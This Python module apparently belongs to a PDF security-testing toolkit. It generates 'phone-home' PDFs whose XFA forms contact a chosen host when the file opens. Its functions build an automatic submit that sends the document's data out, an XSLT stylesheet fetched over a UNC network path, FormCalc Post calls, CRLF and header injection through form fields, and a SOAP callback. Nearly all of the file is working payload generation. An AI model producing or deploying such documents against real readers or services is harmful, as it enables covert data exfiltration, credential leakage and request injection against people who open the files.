"""XFA form phone-home generators."""

from __future__ import annotations

import base64
import bz2
import os
import re
import zlib

from lib.pdf.obfuscation import ensure_scheme

def write_xfa_submit(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1
1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="Hello World!">
            <event activity="docReady" ref="$host" name="event__click">
               <submit
                     textEncoding="UTF-16"
                     xdpContent="pdf datasets xfdf"
                     target="''' + host + '''"/>
            </event>
</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj
trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>''')


def write_xfa_xslt_callback(filename, host):
    with open(filename, "w") as file:
        file.write(r'''%PDF-

1 0 obj <<>>
stream
<?xml version="1.0" ?>
<?xml-stylesheet href="\\\\''' + host + r'''\whatever.xslt" type="text/xsl" ?>
endstream
endobj
trailer <<
    /Root <<

        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>
''')


def write_xfa_formcalc_post(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1
1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="FormCalc Exfil">
            <event activity="initialize">
                <script contentType='application/x-formcalc'>
                    Post("''' + host + '''/test12","formcalc-callback","text/plain","utf-8","")
                </script>
            </event>
</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj
trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>''')


def write_xfa_crlf_submit(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1
1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="CRLF Inject">
            <event activity="docReady" ref="$host" name="event__click">
               <submit
                     textEncoding="UTF-16&#xD;&#xA;X-Injected: true&#xD;&#xA;"
                     xdpContent="pdf datasets xfdf"
                     target="''' + host + '''/test13"/>
            </event>
</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj
trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>''')


def write_formcalc_post_headers(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1
1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="Header Inject">
            <event activity="initialize">
                <script contentType='application/x-formcalc'>
                    Post("''' + host + '''/test15","header-inject-test","text/plain","utf-8","Content-Type: text/html&#x0d;&#x0a;X-Injected: true&#x0d;&#x0a;")
                </script>
            </event>
</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj
trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>''')


def write_xfa_soap_submit(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1
1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="SOAP Callback">
            <event activity="initialize">
               <submit
                     method="soap"
                     action="''' + host + '''/test48-xfa-soap"
                     soapAction="http://soap.action/ping"/>
            </event>
        </field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj
trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>''')
